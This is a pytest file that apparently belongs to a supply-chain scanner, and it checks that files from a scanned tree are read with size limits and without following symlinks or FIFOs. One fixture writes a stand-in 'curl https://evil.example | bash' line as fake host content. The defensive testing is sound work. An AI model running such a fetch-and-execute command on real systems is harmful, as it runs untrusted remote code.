"""Bounded / no-follow reads for the tree-walking detectors.

The supply-chain and reachability walkers read arbitrary files from
the scanned — attacker-controlled — tree.  Every such read must go
through ``parsers._safe_read`` (``read_bounded`` for text,
``read_head_bytes`` for binary sniffs): a bare ``read_text`` follows
symlinks (host-file content leaks into operator-facing finding
details), has no size bound (a huge file OOMs the stage and thereby
suppresses every other finding), and a bare ``open()`` on a FIFO
blocks forever.

The source-audit test at the bottom pins the closure: no bare
``.read_text( `` / ``.open( `` / ``.read_bytes( `` call may reappear
anywhere in the three walker subtrees.
"""

from __future__ import annotations

import logging
import os
import re
from pathlib import Path

import pytest

from packages.sca.models import Confidence, Dependency, Manifest, PinStyle
from packages.sca.parsers._safe_read import (
    _MAX_PARSER_BYTES,
    read_head_bytes,
)
from packages.sca.supply_chain import cargo_build_scripts, python_lifecycle_hooks

_SAFE_READ_LOGGER = "packages.sca.parsers._safe_read"


# ---------------------------------------------------------------------------
# read_head_bytes unit behaviour
# ---------------------------------------------------------------------------

class TestReadHeadBytes:
    def test_reads_regular_file(self, tmp_path: Path) -> None:
        p = tmp_path / "f.bin"
        p.write_bytes(b"\x7fELF" + b"x" * 100)
        assert read_head_bytes(p, max_bytes=4) == b"\x7fELF"

    def test_truncates_not_refuses_oversize(self, tmp_path: Path) -> None:
        p = tmp_path / "big.bin"
        p.write_bytes(b"a" * 1024)
        head = read_head_bytes(p, max_bytes=16)
        assert head == b"a" * 16

    def test_refuses_symlink(self, tmp_path: Path) -> None:
        secret = tmp_path / "outside"
        secret.write_bytes(b"HOSTSECRET")
        link = tmp_path / "link.bin"
        link.symlink_to(secret)
        assert read_head_bytes(link, max_bytes=64) is None

    def test_refuses_fifo(self, tmp_path: Path) -> None:
        if not hasattr(os, "mkfifo"):
            pytest.skip("no mkfifo on this platform")
        fifo = tmp_path / "fifo"
        os.mkfifo(fifo)
        # Must return None promptly instead of blocking on open().
        assert read_head_bytes(fifo, max_bytes=64) is None

    def test_missing_file(self, tmp_path: Path) -> None:
        assert read_head_bytes(tmp_path / "nope", max_bytes=8) is None


# ---------------------------------------------------------------------------
# Walker behaviour through the chokepoint
# ---------------------------------------------------------------------------

def _manifest(p: Path, eco: str) -> Manifest:
    return Manifest(path=p, ecosystem=eco, is_lockfile=False)


def _dep(name: str, eco: str, declared_in: Path) -> Dependency:
    return Dependency(
        ecosystem=eco, name=name, version="1.0.0",
        declared_in=declared_in, scope="main", is_lockfile=False,
        pin_style=PinStyle.EXACT, direct=True,
        purl=f"pkg:{eco.lower()}/{name}@1.0.0",
        parser_confidence=Confidence("high", reason="t"),
    )


def test_symlinked_build_rs_not_read(tmp_path: Path) -> None:
    """A crate whose build.rs is a symlink to a host file must not
    have that file's bytes read into the finding's body preview."""
    host_file = tmp_path / "host-secret"
    host_file.write_text(
        "curl https://evil.example | bash  # HOSTSECRET\n",
        encoding="utf-8",
    )
    crate = tmp_path / "crate"
    crate.mkdir()
    cargo = crate / "Cargo.toml"
    cargo.write_text(
        '[package]\nname = "victim"\nversion = "1.0.0"\n',
        encoding="utf-8",
    )
    (crate / "build.rs").symlink_to(host_file)
    findings = cargo_build_scripts.scan_manifests(
        [_manifest(cargo, "Cargo")], [_dep("victim", "Cargo", cargo)],
    )
    assert not any("HOSTSECRET" in f.detail for f in findings)


def test_oversize_setup_py_refused_not_buffered(
    tmp_path: Path, caplog: pytest.LogCaptureFixture,
) -> None:
    """A sparse multi-GB-shaped setup.py degrades via the size gate's
    refusal, never by buffering the whole file."""
    py = tmp_path / "pyproject.toml"
    py.write_text("[project]\nname = 'victim'\n", encoding="utf-8")
    setup_py = tmp_path / "setup.py"
    with setup_py.open("wb") as fh:
        os.truncate(fh.fileno(), _MAX_PARSER_BYTES + 1)
    with caplog.at_level(logging.WARNING, logger=_SAFE_READ_LOGGER):
        findings = python_lifecycle_hooks.scan_manifests(
            [_manifest(py, "PyPI")], [],
        )
    assert findings == []
    assert "refusing to read" in caplog.text


# ---------------------------------------------------------------------------
# Source audit — the enumeration boundary stays closed
# ---------------------------------------------------------------------------

# Method-style reads (``path.read_text(``, ``tarfile.open(``) PLUS
# bare ``open(`` — the leading-dot-only pattern would let a future
# bare ``open(...)`` regression escape the audit.  The lookbehind
# excludes word chars / dots (method calls already covered), quotes
# and backticks (docstring mentions like ```open(...)```).
_BARE_READ_RE = re.compile(
    r"\.(?:read_text|read_bytes|open)\s*\("
    r"|(?<![\w.`'\"])open\s*\(",
)

_SUBTREES = ("supply_chain", "reachability", "transitive_drop")


def test_no_bare_reads_in_walker_subtrees() -> None:
    """Every target-path read in the walker subtrees must route
    through ``parsers._safe_read`` — assert no bare ``.read_text( ``
    / ``.read_bytes( `` / ``.open( `` call reappears.  (Repo-bundled
    data files count too: uniformity keeps this audit exception-free.)
    """
    pkg_root = Path(__file__).resolve().parents[1]
    offenders: list[str] = []
    for subtree in _SUBTREES:
        for src in sorted((pkg_root / subtree).rglob("*.py")):
            if "tests" in src.relative_to(pkg_root).parts:
                continue
            for line_no, line in enumerate(
                src.read_text(encoding="utf-8").splitlines(), start=1,
            ):
                stripped = line.strip()
                if stripped.startswith("#"):
                    continue
                if _BARE_READ_RE.search(line):
                    offenders.append(f"{src.relative_to(pkg_root)}:{line_no}")
    assert offenders == [], (
        "bare unbounded/symlink-following read calls found — route "
        f"through parsers._safe_read: {offenders}"
    )
